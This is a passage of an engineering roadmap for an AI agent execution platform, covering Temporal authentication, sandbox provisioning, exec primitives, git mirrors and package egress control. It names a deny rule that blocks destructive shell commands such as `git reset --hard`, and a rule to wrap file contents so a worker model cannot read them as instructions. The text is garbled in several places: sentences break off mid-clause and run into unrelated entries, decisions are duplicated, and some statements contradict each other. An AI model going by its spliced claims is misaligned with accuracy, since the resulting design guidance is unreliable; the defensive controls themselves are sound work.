leaving partial writes, and is **restartable** from the last completed block but not resumable.
**Note on foundational ordering:** This entry depends on 1.1a (the durable run engine in Tier 1). The foundational order is 1.1 → 1.1a → 1.9, establishing durable execution and pause/resume primitives before workspace provisioning (2.1) and block orchestration. Core security and human-in-the-loop primitives (6.1 queue, 6.2 permissions, 6.5 injection containment) are sequenced as Phase 1 execution prerequisites per Part 3, ensuring Tier 4 entries have their necessary foundations without tier deadlocks.

#### 1.10 — Temporal authentication and authorization
**Goal:** Reaching the cluster on the tailnet is not the same as being allowed to drive workflows.
**Depends on:** 0.3, 1.1.
**Done when:** the frontend requires **mTLS with `requireClientAuth: true`** against a private CA, so
no tailnet device without an issued client cert can open a gRPC channel; a **JWT `ClaimMapper` plus the
default `Authorizer`** is configured (`authorization.jwtKeyProvider.keySourceURIs`, `claimMapper:
default`, `authorizer: default`); **trust domains are partitioned into coarse isolation tiers (e.g., standard platform workflows versus untrusted external execution like 4.9c local runners), rather than per-project namespaces**, avoiding the operational overhead of N-namespace management for a solo operator while preserving cryptographic and worker isolation where trust boundaries actually differ; `admintools.useExternalFrontend` and
`server.config.namespaces.useExternalFrontend` are enabled, because the internal-frontend path
otherwise **bypasses the Authorizer entirely** for admin tooling and namespace setup.

**Currently there is no authentication at all** — anything on the tailnet can start, signal, query, or
terminate any workflow, which routes around 6.2 completely. Network isolation answers *which devices*,
never *which workflows a device may touch*, and that stops being defensible the moment 4.9c puts a
worker on a laptop.

**Three findings from reading the server source that change the design:**
- **Task queues are not a security boundary. At all.** `CallTarget` carries `APIName`, `Namespace`,
  `NexusEndpointName`, and the request — **no task queue field** — and the source comment says it
  "can be extended to include… TaskQueue," i.e. it has not been. A worker holding namespace-write can
  poll **every** task queue in that namespace. **Namespace is the finest granularity the shipped
  authorizer enforces**, which is why isolation must be per-namespace, not per-queue.
- **`RoleWorker` is unusable as a scope.** Roles compare numerically (`Worker=1, Reader=2, Writer=4,
  Admin=8`, `hasRole >= requiredRole`), `getRequiredRole` never returns `RoleWorker`, and every
  Poll/Respond API is classified `AccessWrite`. So a "worker" grant alone cannot poll — you must grant
  `write`, **which also grants start, signal, and terminate in that namespace.** The default authorizer
  cannot distinguish "may execute tasks" from "may destroy workflows."
- **mTLS alone with the default ClaimMapper denies everything.** `GetClaims` returns empty claims
  immediately when there is no JWT and never consults the certificate DN, so mTLS must be paired with
  JWT — or with a custom ClaimMapper that reads `AuthInfo.TLSSubject`.
**Operational note:** rotated or revoked credentials only take effect when a connection recycles —
already-open poll streams are not re-checked. `frontend.keepAliveMaxConnectionAge` sets that cadence.
**Worker credential lifecycle & connection recycling:** The Temporal Python SDK (`temporalio`) does not
natively support an asynchronous token-refresh callback in `Client.connect()`. When
`frontend.keepAliveMaxConnectionAge` forces connection recycling or an initial short-lived JWT expires,
subsequent poll streams will receive `UNAUTHENTICATED` errors. In Temporal's Rust SDK Core, non-retryable
poll errors are tolerated for only 60 seconds (`LONG_POLL_FATAL_GRACE`) before becoming fatal and shutting
down worker polling. However, the SDK natively supports in-place credential rotation via the
`client.api_key` property setter (and `service_client.update_api_key`), which mutates the Rust Core's
`Arc<RwLock<ClientHeaders>>` without reconnecting or dropping the channel. All long-running workers
(in-cluster orchestrators and 4.9c local runners) MUST execute an asynchronous background token-refresh
loop that periodically renews the JWT before expiry and assigns `client.api_key = refreshed_jwt` to
guarantee unbroken polling across gRPC connection recycles.
**Web UI is a single trust level.** Its outbound connection uses one static identity regardless of who
logged in, so OIDC login without a server-side authorizer is decoration. Restrict it with the blunt
instruments (`disableWriteActions`, `workflowTerminateDisabled`) and do not mistake login for authz.
**OpenShift friction, already documented upstream:** the Temporal chart hardcodes `runAsUser: 1000`
and `fsGroup: 1000`, which collides with `restricted-v2` and fails as `unable to create open
./config/docker.yaml: permission denied` (temporalio/ui#2327, helm-charts#307). There is no
`adaptSecurityContext`-style toggle — override the security contexts to empty and let OpenShift assign
a UID, then verify the image still writes its config dir. Fold this into 0.4's spike.
**Rejected:** a custom `Authorizer` inspecting the deserialized request to gate by task-queue name.
Possible — `CallTarget.Request` holds the proto — but it means maintaining Go code compiled into the
server for isolation that namespace-per-worker already provides. Also rejected: `temporal-proxy`, whose
**Decided:** adopt **Agent Substrate** (`github.com/agent-substrate/substrate`) via its native `ateapipb` gRPC API to drive sandboxes. We will not build a custom controller or narrow workspace interface. Temporal workers will manage the full actor lifecycle by invoking `CreateActor`, `SuspendActor`, `ResumeActor`, and `DeleteActor` directly. Substrate natively handles the generic warm pools and dense multiplexing.
**Decided (Runtime Shift):** We will use standard runc for 95% of tasks, and Substrate's `microvm` SandboxClass using Kata containers only for untrusted workloads. Snapshotting is dropped.
**Decided (MicroVM Architecture):** Agent Substrate's `microvm` class **bypasses OpenShift Sandboxed Containers**. It does not use Kubernetes `RuntimeClass`. Instead, it provisions standard unprivileged worker pods, downloads the Kata guest kernel (`vmlinux`) and Cloud Hypervisor from S3 (`SandboxConfig` assets), and boots the Kata microVM *inside* the pod via `/dev/kvm`. We must ensure the `atelet` daemon exposes `/dev/kvm` to the cluster via device plugins.
**Decided (Storage Standardization):** Workspaces standardize on node-local TopoLVM RWO PVCs. Substrate manages actor lifecycle (Create/Delete) and warm-pool scheduling, while workspace volumes remain on node-local TopoLVM PVCs preserved across block executions.
## Tier 2 — Execution substrate

**Goal:** A task run gets a workspace pod with a checkout, and it is cleaned up afterwards.
**Depends on:** 0.4, 1.1.
**Done when:** requesting a workspace yields a running sandbox pod with its designated storage volume
mounted; the pod lives for the task's duration and is reaped after; `RuntimeClass` is a configuration
value (unset on kind, set on OCP); the hardened baseline (read-only root, all caps dropped, non-root) is
enforced and tested; warm pools cut startup latency. (Repo hydration into the workspace is verified in 2.4).
**Decided:** adopt **Agent Substrate** (`github.com/agent-substrate/substrate`) via its native `ateapipb` gRPC API to drive sandboxes. We will not build a custom controller or narrow workspace interface. Temporal workers will manage the full actor lifecycle by invoking `CreateActor`, `SuspendActor`, `ResumeActor`, and `DeleteActor` directly. Substrate natively handles the generic warm pools and dense multiplexing.
**[SPIKE] Native MicroVM Architecture Feasibility (S8):** Agent Substrate's `microvm` class appears to bypass OpenShift Sandboxed Containers and `RuntimeClass`, instead attempting to boot Kata via direct `/dev/kvm` access inside standard unprivileged worker pods. Because gVisor was already blocked by `restricted-v2` SCCs and SELinux, we cannot assume direct `/dev/kvm` access will succeed. We must execute a spike to validate if OpenShift allows the `atelet` daemon to expose `/dev/kvm` via device plugins, and if SELinux permits the `ateom-microvm` binary to spawn a Cloud Hypervisor VMM.
**Decided (Storage Standardization):** Workspaces standardize on node-local TopoLVM RWO PVCs. Substrate manages actor lifecycle (Create/Delete) and warm-pool scheduling, while workspace volumes remain on node-local TopoLVM PVCs preserved across block executions.
Warm pools absorb generic pod startup; Git hydration executes post-assignment via an active HTTP call to the exec daemon (2.1b).
#### 2.1b — Sandbox workspace image
**Goal:** The image blocks actually execute in exists, is built, and contains what the entries
depending on it assume.
**Done when:** a workspace image is built and published by 0.2's pipeline; it carries the **language
toolchains** blocks need (Python via `uv`, Node with **Corepack explicitly installed** per 2.5 *(Validated: Corepack is unbundled as of Node v25 and requires explicit `npm install -g corepack`)*, Go, and
whatever the operator's projects require), `git`, structural editing utilities like `ast-grep`, a lightweight **sandbox-level MCP server** (e.g., `agent-lsp`), and the **exec daemon**; it runs **non-root under
`restricted-v2` with an arbitrary UID** and a read-only root filesystem, with writable paths declared
explicitly; image contents are versioned and the version is recorded on every run so a failure can be
reproduced. **Crucially, because Substrate warm pools pre-create pods with immutable environments, the exec daemon MUST act as a long-running service exposing an HTTP API. After Temporal calls `ResumeActor`, Temporal issues a `POST /hydrate` request to the daemon containing the JSON manifest of repositories. The daemon performs the delta fetches from the in-cluster mirror and exposes a `/readyz` probe. Because `CreateActor` is asynchronous in Substrate, Temporal must poll `/readyz` to ensure hydration is complete before dispatching any block execution.**
**Decided (Temporal-to-Sandbox Routing & Service Discovery):** Temporal workers do NOT perform direct pod IP lookups or direct pod-to-pod HTTP calls to ephemeral Kata microVMs. Instead, Temporal routes all exec daemon requests (`POST /hydrate`, `/readyz`, and exec/file commands) through Agent Substrate's native **`atenet-router`** service (ClusterIP in the `substrate` namespace). Requests pass the Substrate actor routing header **`ate-target-actor: <atespace>/<actor_id>`**, allowing Envoy/`atenet-router` to dynamically resolve worker location, trigger resumption if paused, and proxy traffic to the target microVM over the CNI overlay. Cross-namespace NetworkPolicies are explicitly configured: an ingress rule on `atenet-router` allows traffic from `temporal-worker` pods in `agent-platform`, and an ingress rule on the sandbox worker namespace allows traffic on the daemon port strictly from `atenet-router`.
**Decided: this is its own entry because four others silently depend on its contents.** 2.4 needs the
project's pre-commit toolchain; 2.5 mandates frozen installs per package manager and states outright
that "Corepack must be installed explicitly in sandbox images"; 4.3 runs arbitrary project commands;
2.2 warns about a sidecar topology giving "the wrong toolchain." Meanwhile 0.2 builds "components that
exist" and 2.1 never says what image it runs. Nobody owned it.
**Decided:** per-project toolchain variation is handled by **declaring a base image per project**, not
by installing toolchains at run time — run-time installs are slow, need egress, and make runs
irreproducible. A project needing something unusual gets its own image derived from the base, which is
**Decided (Research R2): Use a single "fat" Debian-based (glibc) image.** Alpine/musl is a false economy
because it forces Python `pip` to build from source (requiring gcc/make) and breaks `node-gyp`. To
handle OpenShift's read-only root and arbitrary UIDs, package manager caches are explicitly routed to a
writable `/tmp` `emptyDir` via environment variables. We maintain exactly one base image, reserving
derived images strictly for unusual toolchains per the policy above.
**Decided (Inner-Loop Toolchain):** The image must bake in a lightweight MCP server and semantic parsing tools (LSP, ast-grep). Substrate executes the commands, but the LLM communicates with these semantic tools through the MCP server over the Substrate gRPC channel. No complex agent frameworks (OpenHands, SWE-ReX) are included in this image.

#### 2.2 — Authenticated exec and file data plane
**Goal:** Commands run in a sandbox and stream output, over a channel that actually authenticates.
**Depends on:** 2.1.
**Done when:** a per-task bearer token is minted and required by every exec/file call; streaming stdout/
stderr with exit codes works and survives a client reconnect; unauthenticated access from elsewhere in
the cluster is denied by both the token and NetworkPolicy; `kubectl exec` remains available as an
operator debug path only.
**Decided:** we build this auth layer. `sandboxd` explicitly does not authenticate clients, and the
community MCP server in front of it grants full tool access to anyone who can reach the port. Relying on
NetworkPolicy alone is not acceptable for the platform's primary execution channel.
**Decided (Data Plane Ingress & Transport Security):** The authenticated exec data plane traverses `atenet-router`. Each HTTP call sent by Temporal to `atenet-router` carries both the actor routing header (`ate-target-actor: <atespace>/<actor_id>`) and the platform's minted per-task bearer token (`Authorization: Bearer <token>`). `atenet-router` forwards the request and authorization headers intact to the in-pod exec daemon, which validates the bearer token before executing commands. OpenShift OVN-Kubernetes CNI enforces that only `atenet-router` can reach the in-pod daemon port, eliminating unserviced pod IP discovery and securing the data plane across namespace boundaries under `restricted-v2`.
**The primitive set — sufficient for code editing, and knowingly incomplete beyond it.** Beyond
`run_bash` / `read_file` / `write_file`: `list_directory`/`glob`, **`search`/`grep`** (finding without
reading is the single largest token saver), `edit_file` for targeted replacement (whole-file
`write_file` is expensive in *output* tokens), `apply_patch`, and process control for long-running
commands (start, poll, signal) so a dev server or watcher does not block a block. Network fetch is
deliberately **not** a primitive — it is a block (4.9b), so it passes egress policy and audit.
**Do not treat this list as settled.** It covers the code-editing workload and nothing else; external
content and local-machine control each needed their own blocks the moment they were considered.
**The rule: a primitive is added when a block is observed working around its absence** — if blocks are
routinely shelling out to do something a typed primitive should express, that is the signal, and the
workaround is visible in the exec logs. Derive the set from evidence, not from anticipation.

**`run_bash` is not a security boundary, and pretending otherwise is the trap.** It subsumes every
other primitive — anything `read_file` can do, `cat` can do. Removing or restricting it buys *no*
isolation; isolation comes from the sandbox boundary, egress policy, and the 6.2 permission engine.
What typed primitives actually buy is **interception, observability, and token control**, and
`run_bash` is precisely the hole through which those leak. There is a real permission argument though:
`run_bash` is the primitive 6.2 can least statically classify ("run this arbitrary string"), so it
warrants heavier gating, and the untrusted tier (2.7) is a reasonable place to withhold it.

**Large reads are intercepted here and delegated as a *batch*. Two mechanisms, not one:**

1. **Interception (this entry, 2.2).** Detection and redirection live at the tool boundary: a
   `read_file` crossing the threshold, or a bash equivalent, is **blocked and rerouted** rather than
   served. This layer only decides *that* delegation happens.
2. **Batched, question-scoped delegation (a block, using a logical model via 1.3).** The delegated call
   is **`read_files(paths: [...], question: "...")` — plural paths, one question, one answer.** This
   is where the saving actually comes from, and it is the part an interception-only design misses:
   summarising one file saves one file; answering *"how does auth work?"* across eight files avoids
   eight file bodies **and** collapses them into a single scoped result. A generic per-file summary is
   markedly less useful than a targeted answer, so the question is not optional — it is the input that
   makes the output worth having.
3. **Interaction Contract for Interception:** When an agent calls `read_file(path)` and it crosses the threshold, the boundary returns a structured tool error instructing the agent to call `read_files(paths, question)` directly with its specific inquiry, rather than attempting to guess a question for an automated fallback. The call is one-shot and ephemeral, so a follow-up question over the same corpus costs the primary model nothing.

Placement follows the platform's own layering: 2.2 owns detection and interception; the delegation is a
block invoked by it, calling a **logical** cheap model (1.3) and emitting its answer as a run artifact
like any other block output.

Independently validated by Spotify's "Portal/shunt" writeup (Sept 2026) — ~90% mean token reduction on
bulk reads, landing on almost exactly the archived Bulk-Reader design, same **350-line** threshold,
same plural-paths-plus-question shape. Its hard-won lessons, which we adopt:
- **Enforcement belongs in the tool boundary, not in instructions.** Their first attempt was routing
  rules in a context file; those proved "advisory, not enforced" and were ignored. Same principle as
  declare-then-schedule claiming and permission-engine-not-prompt-discipline.
- **Intercept shell equivalents strictly within interactive LLM agent turns** — `cat`, `head`, `tail`,
  `less`, `more` — or an agent's `run_bash` tool silently bypasses the whole mechanism. Crucially,
  this interception applies exclusively to interactive LLM tool invocations; deterministic blocks (4.3),
  build/test runners (e.g., `make`, `pytest`), and pre-commit hooks execute with raw POSIX behavior to
  avoid breaking non-agent shell pipelines.
- **Matching a command string is not enough; it must be decomposed first.** `dev-guard` (the operator's
  own hook plugin, battle-tested on this machine) splits on `&&`, `||`, `;`, and newlines, recurses
  into subshells (`$(...)`, backticks) and `bash -c`, and strips environment-variable prefixes so
  `KUBECONFIG=x oc delete` still matches. Without that, `cd /src && cat big.py` defeats naive
  interception entirely. **Pipe segments are evaluated individually, and an allow on the first segment
  must not protect later ones** — their worked example is a safe command piped into `git reset --hard`,
  which stays blocked. Decomposition belongs to the exec boundary and is shared with 6.2, which faces
  the identical problem.
- **Let targeted reads through**: offset/limit reads and piped commands are already bounded.
- **Below the threshold, the overhead exceeds the saving** — delegation costs 10–30s of latency.
- **Wrap each file with explicit boundaries** (XML tags or CDATA) in the delegated prompt, so file
  contents cannot be read as instructions to the worker model. File content is untrusted input;
  this is 6.5's concern arriving inside a token-optimisation feature.
- **Do not delegate editing or reasoning.** Summaries lack reliable line numbers for editing, and their
  worker model "missed a subtle thread-safety bug" the frontier model caught. Delegate bulk *reading*;
  keep debugging, architecture, and safety-critical analysis on the primary model.
**Open:** whether the same batching applies to `search`/`grep` results — a wide grep across a monorepo
returns a great deal of text, and the identical "N hits plus a question, one answer" shape would apply.

**Gotcha:** `sandboxd` runs commands in whichever container hosts it — **not** wherever the shared
volume is mounted. A sidecar topology looks correct and silently gives blocks the wrong filesystem and
the wrong toolchain. Upstream documents this as a common pitfall.

#### 2.2b — Intra-Block State Validation and Safe Edits
**Goal:** Prevent agents from corrupting files due to stale state, without relying on LLM-hostile strict hashing.
**Depends on:** 2.2.
**Done when:** the `edit_file` and `apply_patch` primitives enforce a **Compare-And-Swap (CAS)** freshness check using a hidden state token (e.g., file `mtime` or `murmur3` hash) tracked since the last `read_file`; modifications via `run_bash` invalidate the token, forcing the agent to re-read; line-number diffing is abandoned in favor of **context-anchored `str_replace`** and **AST-aware structural editing** (`ast_edit`); the agent is provided explicit, actionable error messages upon CAS failure.
**Decided (Research: `hack/research/deep-research-1726963200-safe-edits-isolated-blocks.md`): Strict cryptographic hashing (e.g., SHA-256) is explicitly rejected for agent-facing edit tools.** Forcing LLMs to calculate or verify opaque hashes results in continuous rejection and infinite loops. While 4.5's file claims and isolated local clones prevent *cross-block* concurrency conflicts (explicitly rejecting CRDTs based on AgentRoom/CodeCRDT analysis), a block can still corrupt its own workspace if it mutates a file externally (e.g., via a shell formatter) and then applies a text patch using a stale mental model.
**To solve the intra-block safety gap (Invariant I1):** the tool boundary must track state on the agent's behalf.
- **Read-Before-Edit Enforcement:** `edit_file` checks the hidden token established during the most recent `read_file`. If mismatched, it fails safely, instructing the agent to re-read.
- **Context-Anchored Edits:** Edit payloads must provide the exact `old_str` with enough surrounding context lines to match exactly one block byte-for-byte, making them immune to minor line-number drift.
- **AST-Aware Structural Editing:** Exposing an `ast_edit` tool (via Tree-sitter or ast-grep) allows agents to manipulate semantic nodes (e.g., "replace function X") rather than raw text, entirely sidestepping formatting fragility.

#### 2.3 — Per-project git mirror and warm workspace hydration
**Goal:** Workspaces are hydrated from an in-cluster mirror, not from GitHub, on every task.
**Depends on:** 2.1.
**Scope note:** mirrors are **per repo binding**, not per project — a project with 20 repos has 20
mirrors, and a task hydrates only the subset it declared.
**Done when:** each bound repo has a bare mirror on an RWO PVC, refreshed by **outbound polling** — no
webhook, per the invariant in Part 2; a task workspace is created by cloning from the mirror rather
than from origin; a task requesting a ref the mirror lacks triggers a refresh-and-retry rather
than silently running on stale code; the mirror is rebuildable from origin with no backup dependency;
and **mirror updates are strictly serialized per repo binding** via a concurrency lock, eliminating
ref corruption and lock contention during parallel task execution.
**Decided:** mirror-first for git, for the same reason as packages — a raw network clone per task is a
hot-path dependency on github.com, and leaving git unmirrored while mirroring npm and PyPI is
incoherent. The security win outranks the speed win: **pull comes from in-cluster, so sandboxes need
no GitHub read credentials at all**, and 2.6 narrows to serving push only.
**Trap:** do **not** use `--reference`/alternates against the mirror. A live mirror repacks on every
refresh, which is precisely when alternates break — the `--shared` fragility, made worse by the source
being actively maintained.
**Decided: a minimal pod with bare repos on a PVC, not a forge.** Forgejo and Gitea do support pull
mirroring natively, read-only and drift-proof, which sounds like a fit — but neither has a bulk
"watch N upstreams" API (Forgejo #1282, open), so we would write the same polling automation anyway,
just inside a heavier stateful service carrying an OpenShift SCC compatibility surface across chart
upgrades and a documented retry-storm failure mode when mirror credentials expire (Gitea #34916: CPU
and memory spiking to ~12GB as failed syncs retry without backoff). A bare `git fetch` that fails
simply fails. `kubernetes/git-sync` is also the wrong shape — it maintains a *checkout* for a consumer,
not a bare mirror other pods clone from.
**Refresh cheaply:** `git ls-remote` answers "did any ref change" over the git protocol, so it does
**not** consume GitHub REST API quota at all. Use it as the change detector and only fetch when refs
actually moved. This is strictly cheaper than the REST polling in 5.6 and should not be conflated
with it.
**Decided (Concurrency & Synchronization):** Spike S3 warned that concurrent `git fetch` updates on a bare mirror cause ref corruption and `.git/*.lock` aborts, verified empirically under parallel task loads (`cannot lock ref` errors). The mirror daemon must manage updates through a per-repo exclusive file lock (`flock` on `.git/mirror.lock`) with request coalescing: concurrent refresh triggers (background `git ls-remote` polling, on-demand task missing-ref retries, and 4.7 publish block notifications) queue behind the in-flight fetch rather than spawning competing `git fetch` processes. Read-side clones from task pods access the bare mirror via read-shared access, while fetch holds the exclusive lock, guaranteeing atomic ref visibility. The poll interval is set to 60s with exponential backoff on network failure.

#### 2.4 — Workspace VCS semantics
**Goal:** The shared-vs-isolated codebase model works, including surfacing hook failures.
**Depends on:** 2.2, 2.3, 2.1b.
**Done when:** a workspace exposes the task's **declared repo subset as sibling directories**, each
hydrated from its own mirror; a block declaring `isolated` gets a separate local hardlinked clone on
its own branch; a block declaring `shared` execs in the primary tree; commit and branch work
**locally, with no network access**; **Project Validation Pipeline failures yield the LangGraph session, execute in the sandbox, and resume the paused session with ACI state-sync (formatter mutations) and structured logs** for the orchestrator to route.
**Also done when:** project-level git identity is materialised into every workspace — `user.name`,
`user.email`, `pull.rebase`, excludes, and any commit-trailer policy — rather than inherited from a
base image. The operator already hand-maintains exactly this as a per-project `.gitconfig`; the
platform should own it as project configuration, since it is project-scoped state that never needed
version-control semantics.
**Decided:** **agent blocks are network-isolated from all git remotes.** They read, write, and commit
against the local clone only. Publishing to GitHub is the exclusive job of the deterministic block in
4.7. This means no LLM block ever holds a git credential, and the credential broker's only client is a
non-LLM block whose behaviour is fully specified — a large reduction in what a compromised or
**Decided:** local clone (`git clone /path`), not worktrees or `--shared`.
`--shared` is cheaper but fragile — it writes `objects/info/alternates` with no inode protection, so a
`repack` in the source breaks it. Staying on git — jj cannot run pre-commit hooks (which some validation pipelines rely on).
**Decided (Storage vs Speed):** Because Substrate uses `DurableDir` snapshots which break cross-directory hardlinking, active clones cannot be hardlinked to the bare mirror. A standard Delta clone will occur.

#### 2.5 — Sandbox egress control and package mirrors
**Goal:** Sandboxes reach the package registries they need and nothing else.
**Depends on:** 2.1, 2.3.
**Done when:** pull-through caches for **npm, PyPI, Go modules, and crates.io** serve the common case;
a domain-based allowlist covers only what no mirror can (install-time binary downloads, git
policy is enforced and tested on OCP, and the same manifests apply as a validated no-op on kind.
**Decided (Strict Airgap & Deterministic Fetch):** Sandboxes remain strictly airgapped with **zero internet egress**. The deep-packet TLS proxy was rejected as a massive early-optimization tax. Instead, dynamic dependency resolution is handled via a **Deterministic Dependency Manager Block** outside the sandbox.
**Decided (Spike S2): `git-pkgs/proxy`.** This one small Go binary speaks npm, PyPI, Cargo, Go, and OCI.
It was successfully verified on the live cluster running perfectly under the `restricted-v2` SCC (requiring `runAsUser=null`, `runAsGroup=null`, and `fsGroup=null` in podSecurityContext so OpenShift can assign arbitrary UIDs)
(requiring only `runAsUser: null` in the Helm chart to let OpenShift allocate the UID). It consumes a
mere **37Mi of RAM**, completely eliminating the need for Nexus Repository (which mandates an 8GB floor).
It handles both `uv` and `npm` seamlessly with a local SQLite cache.
**Decided (Spike pl-rsch-4): In-cluster HTTPS and CA trust injection under read-only root.** To prevent cleartext credential, token, and package interception in-cluster, `git-pkgs/proxy` serves over HTTPS using OpenShift service-ca serving certificates. Because sandboxes run under `restricted-v2` with an arbitrary UID and a read-only root filesystem (`/`), runtime installation of CA certificates into `/etc/ssl/certs` or `/etc/pki/ca-trust` (`update-ca-trust`/`update-ca-certificates`) is impossible. The cluster CA bundle is projected into the sandbox pod via a ConfigMap volume mount (`/var/run/certs/ca-bundle.crt`), and toolchains are configured via ecosystem-specific environment variables in the pod spec (2.1b): `SSL_CERT_FILE` (pointing to a combined bundle of public roots and the service CA, covering `uv`, `pip`, Go `crypto/x509`, and curl), `NODE_EXTRA_CA_CERTS` (for Node.js, `npm`, and `pnpm`, which ignore `SSL_CERT_FILE`), `CARGO_HTTP_CAINFO` (for Cargo), and `GIT_SSL_CAINFO` (for Git over HTTPS).
**Rust needs no dedicated mirror.** Sparse registry has been Cargo's default since 1.70, so
`[source.crates-io] replace-with` against any sparse-capable HTTP cache works. Three things the cache
must get right, which a naive nginx/Varnish config will not: honour ETag/If-None-Match, pass 404/410/451
through correctly for yanked crates, and **rewrite the `config.json` download URL** so `.crate` fetches
also route through the mirror. `panamax` is effectively abandoned — **last pushed 2024-06-06** — and is
now only interesting for offline `rustup` toolchain mirroring. `kellnr` (Apache-2.0, actively pushed) is
the maintained Rust-native option if a dedicated one is ever wanted.

**Containers are a separate, cleaner mechanism — don't route them through the language mirror.**
OpenShift has a native path: `ImageDigestMirrorSet`/`ImageTagMirrorSet` plus a plain `registry:2`
pull-through cache (`REGISTRY_PROXY_REMOTEURL`), with `mirrorSourcePolicy: NeverContactSource` for
strict enforcement. kind does the same via `containerdConfigPatches`. No SCC fight, since it is the
stock registry image.

**A pull-through cache is an egress control, not a supply-chain control.** By itself it caches a
malicious package faster. What adds real safety is quarantine/cooldown on newly published versions and
scanning — Nexus CE gained Sonatype Repository Firewall free in 2026; `git-pkgs/proxy` ships
version-cooldown natively; Verdaccio, devpi, and Athens are deliberately dumb caches with neither.
Known gap in the scanning story: `git-pkgs/proxy` does **not** re-scan already-cached artifacts when a
CVE is published later, so a clean-on-ingest package stays clean-on-record indefinitely.
The framing to hold onto: *the allowlist was correct; the thing on the allowlist was the problem.*

**Blocking install scripts is client-side, not a mirror feature.** No mirror does this for us. Block
execution defaults carry `--ignore-scripts` on the first install pass, frozen/locked installs, and
`--require-hashes` where supported, with relaxation as an explicit per-project opt-in. This neutralises
the highest-likelihood threat in the model (malicious package executing at install time) more cheaply
and more effectively than any runtime isolation tier.

**Package manager policy: detect, never impose.** A target repo's lockfile is committed and its CI
depends on it — swapping its package manager would change the resolved dependency graph, which is an
unrequested code change to the user's project. Resolve the manager from the `packageManager` field
first, lockfile sniffing second, and **flag ambiguous or multi-lockfile repos rather than guessing**.
Then apply the frozen-install form for whichever manager that is (`npm ci`,
`pnpm install --frozen-lockfile`, `yarn install --immutable`, `bun install --frozen-lockfile`,
`uv sync --locked`, `cargo build --locked`, `go mod download` against a pinned proxy).

**Client-side cooldown cannot replace mirror-side quarantine.** All four JS managers now have a
cooldown setting (pnpm `minimumReleaseAge`, Bun's seconds-valued equivalent, Yarn `npmMinimalAgeGate`,
npm `min-release-age`), which initially looks like it removes the need for quarantine at the mirror.
It does not, for three reasons: target repos pin manager versions that predate the feature; **Bun's
implementation is bypassed entirely by a committed lockfile** (GH #30525) — exactly the frozen-install
path we mandate above; and we do not control what a user's repo pins. Server-side quarantine in the
2.5 mirror is therefore the control that actually holds. Client flags are defense-in-depth.

**Corepack must be installed explicitly in sandbox images.** Reported unbundled from Node.js as of v25
following a Node TSC decision, with Node 26 also excluding it — if true, `packageManager`-field
detection breaks silently without it. *Confirm against Node release notes during planning.* The
corepack repo itself is alive (actively pushed 2026-09-18), consistent with a standalone-install future.
Set two env vars explicitly rather than trusting defaults: `COREPACK_ENABLE_STRICT=1` so a block can
never silently drift to an unpinned manager version, and **`COREPACK_ENABLE_AUTO_PIN=0`** — auto-pin
writes a resolved version into the user's `package.json`, which is exactly the unrequested repo diff
the detect-never-impose rule exists to prevent.

**Git-hosted dependencies are a recurring bypass vector across every manager, not an npm quirk.** They
evade the registry mirror (no registry protocol involved), and they have repeatedly evaded
script-blocking too: pnpm's CVE-2025-69264 let git deps run `prepare`/`prepublish`/`prepack` during
fetch despite the default block, fixed only in 10.26.0+. npm v12 responded by defaulting `--allow-git`
and `--allow-remote` to none. Treat a git dependency as its own escalation: deny by default, allow
per-host explicitly, and pin manager versions above the known-CVE floor. *(Validated: pnpm 12 blocks postinstall scripts and enforces a 1-day cooldown by default. Yarn's `npmMinimalAgeGate` also defaults to 1 day as of v4.12).*

**Escape hatches no mirror can close** — each needs an explicit per-host allowlist entry, vendoring, or
a policy tool that converts a silent bypass into a hard failure:
- **npm:** `node-gyp`/`node-pre-gyp`/`prebuild-install` fetch prebuilt native binaries from GitHub
  Releases, S3, and vendor CDNs — outside the registry protocol entirely. Postinstall scripts can
  `curl` anything. Partial mitigation: `{pkg}_binary_host_mirror` npmrc variables can redirect a
  specific package's binary host, or force compile-from-source (which needs a toolchain in-sandbox).
- **PyPI:** URL-pinned dependencies (`pkg @ https://...`) and packages downloading model weights or
  assets at install time. Hash-checking mode is unaffected by a cache — the bytes are identical.
- **Go:** `replace` directives pointing at raw VCS URLs bypass `GOPROXY` completely. Use
  `GOPROXY=<mirror>,off` — **not** `,direct` — so a miss fails closed instead of silently reaching the
  internet. Rather than `GOSUMDB=off`, either proxy `sum.golang.org` through the mirror too or scope
  `GOPRIVATE`/`GONOSUMDB` narrowly to genuinely private module paths; disabling checksum verification
  globally trades a mirror problem for a much worse integrity problem.
- **Cargo:** `git = "..."` dependencies clone directly; the Cargo Book confirms source replacement does
  not intercept git sources. `build.rs` can download binaries at build time. `cargo-deny`'s
  `[sources] allow-git` turns this into an enforced failure.
**Decided:** mirrors first — they remove most egress need, and they offset the network penalty of any
stronger runtime later. Plain `NetworkPolicy` cannot do FQDN allowlisting; hostname targeting is an
explicit non-goal of the API.
**Three traps to design around, each documented:**
- **Dependency confusion — and it is narrower than it looks.** The rule is to configure the mirror as
  the *sole* `index-url`, never as an `extra-index-url` alongside the public registry: plain pip and
  npm resolve to the highest version across indexes, so an attacker publishing a higher version
  publicly wins. But three of our four ecosystems are already safe by construction: **`uv` defaults to
  a `first-index` strategy** — a package found on the private index is never satisfied from public
  PyPI even if a newer version exists there — and since this project mandates `uv`, PyPI is covered.
  Cargo's single `replace-with` target is inherently single-source. Go's `GOPRIVATE`/`GONOPROXY` make
  the separation explicit. **npm is the real exposure.** Equally, for every ecosystem: once the mirror
  works, *block* direct public registry egress, or the mirror provides no security benefit at all.
- **The RFC1918-except silent block.** The intuitive policy — allow `0.0.0.0/0` except RFC1918 —
  also blocks the Kubernetes API server, whose ClusterIP sits inside an excepted range. It fails with
  no error in kubelet logs, audit logs, or anywhere else. If anything in the sandbox needs API access,
  allow its ClusterIP explicitly.
- **Metadata blocking needs two layers.** Block `169.254.0.0/16` in NetworkPolicy *and* with a
  node-level iptables DROP, so a CNI gap or policy bug is not the only thing standing between an agent
  and cloud credentials.
**Decided (Spike S1): `dnsName` exists but is not trustworthy for CDN-backed hosts — plan around it, not on it.**
EgressFirewall's legacy path resolves a name periodically and caches the resulting IPs into an address set.
Spike S1 confirmed that OVN implemented this rule by creating a static address set with a point-in-time
list of IPs. Because OVN explicitly whitelists these specific IPs via polling, a host that round-robins,
geo-balances, or rotates IPs on a short TTL will serve the workload an address the firewall never cached,
dropping the connection. Furthermore, Spike S1 confirmed the `DNSNameResolver` CRD is completely missing
and disabled in the cluster's feature gates, meaning the improved resolution path is dead on arrival.
The hosts most affected are precisely the ones we
care about — package registries and CDN-fronted binary hosts.

**Therefore, ranked by preference, per destination:**
1. **Mirror it** — the fragile hosts are exactly the mirrorable ones. After 2.5's mirrors and 2.3's git
